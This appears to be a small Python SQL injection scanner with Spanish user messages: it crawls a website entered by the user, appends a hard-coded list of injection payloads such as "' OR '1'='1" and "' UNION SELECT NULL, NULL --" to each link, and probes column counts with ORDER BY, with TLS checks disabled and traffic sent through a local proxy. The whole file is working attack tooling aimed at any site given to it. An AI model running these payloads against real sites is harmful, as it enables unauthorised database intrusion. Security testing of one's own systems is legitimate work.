import requests
import sys
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import time
import random
from urllib.parse import urlparse

proxies = {'http': 'http://127.0.0.1:8081', 'https': 'http://127.0.0.1:8081'}

# request with tries
def get_response(url, retries=3):
    for i in range(retries):
        try:
            r = requests.get(url, verify=False, proxies=proxies)
            if r.status_code == 200:
                return r
            elif r.status_code == 403:
                print(f"[+] Felicitaciones, su página web es segura: el acceso a {url} fue bloqueado con un código 403 (Forbidden).")
                return r
        except requests.RequestException as e:
            #print(f"[!] Error fetching {url}: {e}. Retrying ({i+1}/{retries})...")
            time.sleep(random.uniform(1, 3))  
    print(f"[-] Failed to retrieve {url} after {retries} retries.")
    return None

# try to get paths with get parameter
def find_urls_to_test(url, base_url):
    response = get_response(url)
    if not response:
        return set()

    soup = BeautifulSoup(response.text, 'html.parser')

    base_url = base_url.rstrip('/')
    parsed_base_url = urlparse(base_url)

    links = set()
    for a_tag in soup.find_all('a', href=True):
        href = a_tag['href']
        
        parsed_href = urlparse(href)
        if parsed_href.netloc and parsed_href.netloc != parsed_base_url.netloc:
            continue
        
        full_url = href if href.startswith('http') else base_url + href
        
        if "Id" not in href:
            full_url = href if href.startswith('http') else base_url + href
            links.add(full_url)
            if "?" in href:
               full_url = href if href.startswith('http') else base_url + href
               links.add(full_url)
            elif href.startswith('/'):
               full_url = base_url + href
               links.add(full_url)

    if not links:
        print("[!] No parameterized URLs found, searching deeper in the page source...")
        scripts = soup.find_all('script')
        for script in scripts:
            if "?" in script.text:
                print("[+] Found a possible URL in script content.")
                links.add(script.text)

    if not links:
        print("[-] No URLs with parameters found.")
    else:
        print(f"[+] Found {len(links)} URLs with parameters.")
    
    return links

# perform the sql injection
def exploit_sqli(url):
    payloads = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR 1=1 --",
        '" OR "1"="1"',
        '" OR "1"="1" --',
        "' OR 'a'='a",
        "' OR 'a'='a' --",
        "1 OR 1=1",
        "admin' --",
        "' UNION SELECT NULL, NULL --"
    ]

    for payload in payloads:
        target_url = url + payload
        r = requests.get(target_url, verify=False, proxies=proxies)
        if "Internal Server Error" in r.text:
            print(f"[+] Vulnerable URL found with payload {payload}")
            return True

    return False

# function that detects column numbers
def exploit_sqli_column_number(url):
    for i in range(1, 5):
        target_url = url + "'+order+by+%s--" % i
        r = requests.get(target_url, verify=False, proxies=proxies)
        if "Internal Server Error" in r.text:
            return i - 1 
    return False

if __name__ == "__main__":
    
    base_url = input("Ingrese la URL que quiere escanear: ").strip()
    base_url = base_url.rstrip('/')

    print("[+] Crawling the website to find URLs with parameters...")
    urls_to_test = find_urls_to_test(base_url, base_url)

    if urls_to_test:
        print("[+] Found the following URLs with parameters:")
        for url in urls_to_test:
            print(url)

        print("\n[+] Testing each URL for SQL Injection vulnerabilities...")

        for test_url in urls_to_test:
            print(f"\n[+] Testing URL: {test_url}")
            is_vulnerable = exploit_sqli(test_url)
             
            if not is_vulnerable:
                num_col = exploit_sqli_column_number(test_url)
                if num_col:
                    print(f"[+] Vulnerable URL found: {test_url}")
                    print(f"[+] Pudimos determinar que su base de datos tiene {num_col} columnas en esta URL")
                else:
                    print(f"[-] URL not vulnerable: {test_url}")
    else:
        print("[-] No URLs with parameters found.")

